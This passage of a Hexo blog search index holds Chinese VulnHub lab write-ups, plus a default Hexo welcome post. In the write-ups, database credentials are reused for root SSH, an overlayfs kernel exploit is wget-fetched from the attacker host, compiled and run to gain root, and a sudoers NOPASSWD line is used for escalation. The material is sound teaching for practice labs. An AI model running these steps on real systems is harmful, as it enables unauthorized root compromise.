class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_temp_log_threshold&#x27;</span>] = <span class="hljs-string">&#x27;32M&#x27;</span>;<br><br><br>?&gt;<br></code></pre></td></tr></table></figure><p>得到了数据库的用户名和密码，这时候我们要有一定的敏感度，拿到一个用户名和密码都要考虑用户名和密码重用的可能性，这里 ssh 登录发现直接成功了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> ssh root@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>     <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.161 (10.10.10.161)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:UyLCTuDmpoRJdivxmtTOMWDk0apVt5NWjp8Xno1e+Z4.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><span class="hljs-string">&#x27; (ECDSA) to the list of known hosts.</span><br><span class="hljs-string">root@10.10.10.161&#x27;</span>s password: <br>Welcome to Ubuntu <span class="hljs-number">12.04</span>.<span class="hljs-number">5</span> LTS (GNU/Linux <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span><span class="hljs-literal">-32-generic</span> i686)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>  System information as of Wed May <span class="hljs-number">24</span> <span class="hljs-number">16</span>:<span class="hljs-number">41</span>:<span class="hljs-number">21</span> IST <span class="hljs-number">2023</span><br><br>  System load:  <span class="hljs-number">0.0</span>               Processes:           <span class="hljs-number">113</span><br>  Usage of /:   <span class="hljs-number">13.7</span>% of <span class="hljs-number">9.61</span>GB   Users logged <span class="hljs-keyword">in</span>:     <span class="hljs-number">0</span><br>  Memory usage: <span class="hljs-number">22</span>%               IP address <span class="hljs-keyword">for</span> eth0: <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br>  Swap usage:   <span class="hljs-number">0</span>%<br><br>  Graph this <span class="hljs-keyword">data</span> and manage this system at:<br>    https://landscape.canonical.com/<br><br>New release <span class="hljs-string">&#x27;14.04.5 LTS&#x27;</span> available.<br>Run <span class="hljs-string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.<br><br><br>Your Hardware Enablement Stack (HWE) is supported <span class="hljs-keyword">until</span> April <span class="hljs-number">2017</span>.<br><br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>root@indipowershell:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>再考虑别的提权方式，内核比较老，考虑内核提权，搜索内核版本对应的exp</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> searchsploit kernel <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>                                              <br><span class="hljs-literal">-------------------------------------------------------------------------------------------------------</span> <span class="hljs-literal">---------------------------------</span><br> Exploit Title                                                                                         |  Path<br><span class="hljs-literal">-------------------------------------------------------------------------------------------------------</span> <span class="hljs-literal">---------------------------------</span><br>Android Kernel &lt; <span class="hljs-number">4.8</span> - ptrace seccomp <span class="hljs-keyword">Filter</span> Bypass                                                    | android/dos/<span class="hljs-number">46434</span>.c<br>Apple iOS &lt; <span class="hljs-number">10.3</span>.<span class="hljs-number">1</span> - Kernel                                                                            | ios/local/<span class="hljs-number">42555</span>.txt<br>Apple Mac OSX &lt; <span class="hljs-number">10.6</span>.<span class="hljs-number">7</span> - Kernel Panic (Denial of Service)                                              | osx/dos/<span class="hljs-number">17901</span>.c<br>Apple macOS &lt; <span class="hljs-number">10.12</span>.<span class="hljs-number">2</span> / iOS &lt; <span class="hljs-number">10.2</span> - <span class="hljs-string">&#x27;_kernelrpc_mach_port_insert_right_trap&#x27;</span> Kernel Reference Count L | macos/local/<span class="hljs-number">40956</span>.c<br>Apple macOS &lt; <span class="hljs-number">10.12</span>.<span class="hljs-number">2</span> / iOS &lt; <span class="hljs-number">10.2</span> - Broken Kernel Mach Port Name uref Handling Privileged Port Name <span class="hljs-built_in">R</span> | macos/local/<span class="hljs-number">40957</span>.c<br>Apple macOS &lt; <span class="hljs-number">10.12</span>.<span class="hljs-number">2</span> / iOS &lt; <span class="hljs-number">10.2</span> Kernel - ipc_port_t Reference Count Leak Due to Incorrect externalM | multiple/dos/<span class="hljs-number">40955</span>.txt<br>DESlock+ &lt; <span class="hljs-number">4.1</span>.<span class="hljs-number">10</span> - <span class="hljs-string">&#x27;vdlptokn.sys&#x27;</span> Local Kernel Ring0 SYSTEM                                           | windows/local/<span class="hljs-number">16138</span>.c<br>Jungo DriverWizard WinDriver &lt; <span class="hljs-number">12.4</span>.<span class="hljs-number">0</span> - Kernel <span class="hljs-built_in">Out-of</span><span class="hljs-literal">-Bounds</span> <span class="hljs-built_in">Write</span> Privilege Escalation                | windows/local/<span class="hljs-number">42625</span>.py<br>Jungo DriverWizard WinDriver &lt; <span class="hljs-number">12.4</span>.<span class="hljs-number">0</span> - Kernel Pool Overflow / Local Privilege Escalation (<span class="hljs-number">1</span>)          | windows/local/<span class="hljs-number">42624</span>.py<br>Jungo DriverWizard WinDriver &lt; <span class="hljs-number">12.4</span>.<span class="hljs-number">0</span> - Kernel Pool Overflow / Local Privilege Escalation (<span class="hljs-number">2</span>)          | windows/local/<span class="hljs-number">42665</span>.py<br>Linux Kernel (Solaris <span class="hljs-number">10</span> / &lt; <span class="hljs-number">5.10</span> <span class="hljs-number">138888</span><span class="hljs-literal">-01</span>) - Local Privilege Escalation                              | solaris/local/<span class="hljs-number">15962</span>.c<br>Linux Kernel <span class="hljs-number">2.6</span>.<span class="hljs-number">19</span> &lt; <span class="hljs-number">5.9</span> - <span class="hljs-string">&#x27;Netfilter Local Privilege Escalation                                      | linux/local/50135.c</span><br><span class="hljs-string">Linux Kernel 3.11 &lt; 4.8 0 - &#x27;</span>SO_SNDBUFFORCE<span class="hljs-string">&#x27; / &#x27;</span>SO_RCVBUFFORCE<span class="hljs-string">&#x27; Local Privilege Escalation             | linux/local/41995.c</span><br><span class="hljs-string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="hljs-string">&#x27; Local Privilege Escalation   | linux/local/37292.c</span><br><span class="hljs-string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="hljs-string">&#x27; Local Privilege Escalation ( | linux/local/37293.txt</span><br><span class="hljs-string">Linux Kernel 3.14-rc1 &lt; 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation         | linux_x86-64/local/33516.c</span><br><span class="hljs-string">Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - &#x27;</span>CONFIG_X86_X32=y<span class="hljs-string">&#x27; Local Privilege Escalation (3) | linux_x86-64/local/31347.c</span><br><span class="hljs-string">Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.10) - &#x27;</span>CONFIG_X86_X32<span class="hljs-string">&#x27; Arbitrary Write (2)                        | linux/local/31346.c</span><br><span class="hljs-string">Linux Kernel 3.4 &lt; 3.13.2 - recvmmsg x32 compat (PoC)                                                  | linux/dos/31305.c</span><br><span class="hljs-string">Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                   | linux/dos/43234.c</span><br><span class="hljs-string">Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation                                             | linux/local/41886.c</span><br><span class="hljs-string">Linux Kernel &lt; 3.16.1 - &#x27;</span>Remount FUSE<span class="hljs-string">&#x27; Local Privilege Escalation                                      | linux/local/34923.c</span><br><span class="hljs-string">Linux Kernel &lt; 3.16.39 (Debian 8 x64) - &#x27;</span>inotfiy<span class="hljs-string">&#x27; Local Privilege Escalation                           | linux_x86-64/local/44302.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.10.13 - &#x27;</span>keyctl_set_reqkey_keyring<span class="hljs-string">&#x27; Local Denial of Service                           | linux/dos/42136.c</span><br><span class="hljs-string">Linux kernel &lt; 4.10.15 - Race Condition Privilege Escalation                                           | linux/local/43345.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.11.8 - &#x27;</span>mq_notify: double sock_put()<span class="hljs-string">&#x27; Local Privilege Escalation                      | linux/local/45553.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.13.1 - BlueTooth Buffer Overflow (PoC)                                                | linux/dos/42762.txt</span><br><span class="hljs-string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                          | linux/local/45010.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.14.rc3 - Local Denial of Service                                                      | linux/dos/42932.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.15.4 - &#x27;</span>show_floppy<span class="hljs-string">&#x27; KASLR Address Leak                                               | linux/local/44325.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.16.11 - &#x27;</span>ext4_read_inline_data()<span class="hljs-string">&#x27; Memory Corruption                                   | linux/dos/44832.txt</span><br><span class="hljs-string">Linux Kernel &lt; 4.17-rc1 - &#x27;</span>AF_LLC<span class="hljs-string">&#x27; Double Free                                                         | linux/dos/44579.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                 | linux/local/44298.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#x27;</span>netfilter target_offset<span class="hljs-string">&#x27; Local Privilege Escalation      | linux_x86-64/local/44300.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)  | linux/local/43418.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escala | linux/local/47169.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.5.1 - Off-By-One (PoC)                                                                | linux/dos/44301.c</span><br><span class="hljs-string">macOS &lt; 10.14.3 / iOS &lt; 12.1.3 - Kernel Heap Overflow in PF_KEY due to Lack of Bounds Checking when Re | multiple/dos/46300.c</span><br><span class="hljs-string">Sony Playstation 4 (PS4) &lt; 7.02 / FreeBSD 9 / FreeBSD 12 - &#x27;</span>ip6_setpktopt<span class="hljs-string">&#x27; Kernel Local Privilege Esca | hardware/local/48644.c</span><br><span class="hljs-string">------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="hljs-string">powershellcodes: No Results</span><br><span class="hljs-string">                                                                                                                                         </span><br><span class="hljs-string">┌──(kali㉿kali)-[~]</span><br><span class="hljs-string">└─$ searchsploit -m 37292     </span><br><span class="hljs-string">  Exploit: Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="hljs-string">&#x27; Local Privilege Escalation</span><br><span class="hljs-string">      URL: https://www.exploit-db.com/exploits/37292</span><br><span class="hljs-string">     Path: /usr/share/exploitdb/exploits/linux/local/37292.c</span><br><span class="hljs-string">File Type: C source, ASCII text, with very long lines (466)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>尝试使用overlayfs</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs powershell">www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>/<span class="hljs-number">37292</span>.c<br><span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>/<span class="hljs-number">37292</span>.c<br><span class="hljs-literal">--2023-05-24</span> <span class="hljs-number">17</span>:<span class="hljs-number">16</span>:<span class="hljs-number">57</span><span class="hljs-literal">--</span>  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>/<span class="hljs-number">37292</span>.c<br>Connecting to <span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>... connected.<br>HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK<br>Length: <span class="hljs-number">4968</span> (<span class="hljs-number">4.9</span>K) [<span class="hljs-type">text</span>/<span class="hljs-type">x</span>-<span class="hljs-type">csrc</span>]<br>Saving to: `37292.c<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">100%[======================================&gt;] 4,968       --.-K/s   in 0s      </span><br><span class="hljs-string"></span><br><span class="hljs-string">2023-05-24 17:16:57 (166 MB/s) - `37292.c&#x27;</span> saved [<span class="hljs-number">4968</span>/<span class="hljs-number">4968</span>]<br><br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-number">37292</span>.c<br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> gcc <span class="hljs-number">37292</span>.c <span class="hljs-literal">-o</span> overlayfs <br>gcc <span class="hljs-number">37292</span>.c <span class="hljs-literal">-o</span> overlayfs<br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> ./overlayfs<br>./overlayfs<br>spawning threads<br><span class="hljs-built_in">mount</span> <span class="hljs-comment">#1</span><br><span class="hljs-built_in">mount</span> <span class="hljs-comment">#2</span><br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br><span class="hljs-comment"># whoami</span><br>whoami<br>root<br><span class="hljs-comment"># id</span><br>id<br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root),<span class="hljs-number">33</span>(www<span class="hljs-literal">-data</span>)<br><span class="hljs-comment"># ip a</span><br>ip a<br><span class="hljs-number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="hljs-number">65536</span> qdisc noqueue state UNKNOWN <br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    inet <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="hljs-number">1500</span> qdisc pfifo_fast state UP qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:a9:a2:<span class="hljs-number">24</span> brd ff:ff:ff:ff:ff:ff<br>    inet <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.10</span>.<span class="hljs-number">10.255</span> scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::<span class="hljs-number">20</span>c:<span class="hljs-number">29</span>ff:fea9:a224/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>成功提权</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/05/1122f47ad30c.html"/>
    <url>/2023/05/1122f47ad30c.html</url>
    
    <content type="html"><![CDATA[<h1 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h1><p>[[Kioptrix1.2靶机.md]]</p><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>#LotusCMS远程代码执行 [[Kioptrix1.2靶机.md|Kioptrix1.2靶机LotusCMS]]</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>#ht编辑器提权 [[Kioptrix1.2靶机.md#ht软件编辑器提权]]：&#x2F;etc&#x2F;sudoers <code>myuser ALL=(ALL) NOPASSWD: ALL</code></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>knowledge</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/05/d57b13de7450.html"/>
    <url>/2023/05/d57b13de7450.html</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
